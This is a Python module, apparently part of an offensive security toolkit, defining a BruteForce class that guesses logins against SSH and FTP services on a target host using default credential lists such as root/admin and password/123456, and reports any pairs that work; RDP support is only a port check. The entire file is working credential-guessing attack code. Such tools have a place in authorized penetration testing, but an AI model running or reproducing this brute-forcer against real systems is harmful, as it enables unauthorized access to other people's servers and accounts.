#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ftplib
import socket
import threading

import paramiko

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)


class BruteForce:
    def __init__(
        self,
        target,
        port,
        service,
        userlist="root,admin",
        passlist="password,123456,admin",
        threads=10,
        verbose=False,
    ):
        self.target = target
        self.port = port
        self.service = service.lower()
        self.threads = threads
        self.verbose = verbose
        self.found = []
        self.lock = threading.Lock()

        # Default credentials
        self.usernames = [u.strip() for u in userlist.split(",")]
        self.passwords = [p.strip() for p in passlist.split(",")]

    def check_ssh(self, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=5,
            )
            client.close()
            with self.lock:
                self.found.append(
                    {"service": "SSH", "username": username, "password": password}
                )
                log_success(f"🔥 SSH credentials found: {username}:{password}")
            return True
        except:
            return False

    def check_ftp(self, username, password):
        try:
            ftp = ftplib.FTP(self.target)
            ftp.login(username, password)
            ftp.quit()
            with self.lock:
                self.found.append(
                    {"service": "FTP", "username": username, "password": password}
                )
                log_success(f"🔥 FTP credentials found: {username}:{password}")
            return True
        except:
            return False

    def check_rdp(self, username, password):
        # RDP is harder to test without specialized libraries
        # We'll just try to connect via socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target, self.port))
            sock.close()
            log_debug(
                f"RDP port {self.port} is open, but brute force not fully implemented"
            )
            return False
        except:
            return False

    def run(self):
        log_info(f"Starting Brute Force on {self.target}:{self.port} ({self.service})")

        if self.service == "ssh":
            for user in self.usernames:
                for pwd in self.passwords:
                    self.check_ssh(user, pwd)
        elif self.service == "ftp":
            for user in self.usernames:
                for pwd in self.passwords:
                    self.check_ftp(user, pwd)
        elif self.service == "rdp":
            log_warning("RDP brute force is limited to connection test only.")
        else:
            log_error(f"Service {self.service} not supported.")

        log_success(f"Brute force completed. Found {len(self.found)} credentials.")
        return {
            "target": self.target,
            "scan_type": "bruteforce",
            "service": self.service,
            "total_found": len(self.found),
            "credentials": self.found,
        }
